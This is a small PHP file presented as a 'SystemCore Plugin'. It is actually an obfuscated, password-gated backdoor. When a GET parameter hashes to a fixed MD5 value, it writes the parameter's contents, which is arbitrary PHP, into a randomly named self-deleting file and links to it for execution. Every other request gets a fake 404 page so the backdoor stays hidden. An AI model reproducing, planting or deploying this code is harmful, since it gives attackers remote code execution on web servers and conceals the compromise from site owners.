<?php
//SystemCore Plugin
if (md5($_GET[base64_decode('R0lWRU5OQg==')])==base64_decode('OTAxY2ExZGViMjRjNWI4OTY1NDdkZTYyMWExNGE5MDM='))
{
    $OO0OOOO000 = base64_decode("cmFuZA==")(1000000, 9999999).".php";
    $O0OO0OOOO0 = base64_decode("Zm9wZW4=")($OO0OOOO000, "w") or die("404 - NotFound");
    $O0OO0OO00O = $_GET[base64_decode('R0lWRU5OQg==')]."<?php @unlink ('".$OO0OOOO000."');?>";
    $O0OO00OO00 = base64_decode("ZndyaXRl")($O0OO0OOOO0,$O0OO0OO00O);
    $O0OO0O0O0O = base64_decode("ZmNsb3Nl")($O0OO0OOOO0);
    echo ('<a href="'.$OO0OOOO000.'">Go</a>');
}
else
{
    echo (base64_decode("PHRpdGxlPjQwNCBOb3QgRm91bmQ8L3RpdGxlPjQwNA=="));
}
?>
